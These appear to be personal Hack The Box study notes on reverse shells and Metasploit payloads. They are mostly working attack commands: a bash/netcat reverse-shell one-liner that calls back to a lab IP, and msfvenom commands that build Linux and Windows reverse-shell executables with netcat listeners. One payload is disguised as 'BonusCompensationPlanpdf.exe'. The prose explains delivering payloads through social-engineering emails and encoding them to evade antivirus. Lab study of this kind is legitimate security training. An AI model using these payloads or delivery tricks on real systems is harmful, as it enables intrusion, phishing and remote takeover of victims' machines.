#### Netcat/Bash Reverse Shell One-liner

```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```


# Automating Payloads & Delivery with Metasploit

```shell-session
meterpreter > shell
```

# Crafting Payloads with MSFvenom
to use `MSFvenom` to craft a payload and send it via email message or other means of social engineering to drive that user to execute the file.

MSFvenom also allows us to `encrypt` & `encode` payloads to bypass common anti-virus detection signatures

```shell-session
AhmaDb0x@htb[/htb]$ msfvenom -l payloads
```

## Staged vs. Stageless Payloads
Staged
`linux/x86/shell/reverse_tcp`. When run using an exploit module in Metasploit, this payload will send a small `stage` that will be executed on the target and then call back to the `attack box` to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell.

`Stageless` payloads do not have a stage. Take for example this payload `linux/zarch/meterpreter_reverse_tcp`. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering.

## Building A Stageless Payload
```shell-session
AhmaDb0x@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
```shell-session
AhmaDb0x@htb[/htb]$ sudo nc -lvnp 443
```


## Building a simple Stageless Payload for a Windows system
```shell-session
AhmaDb0x@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

```shell-session
AhmaDb0x@htb[/htb]$ sudo nc -lvnp 443
```

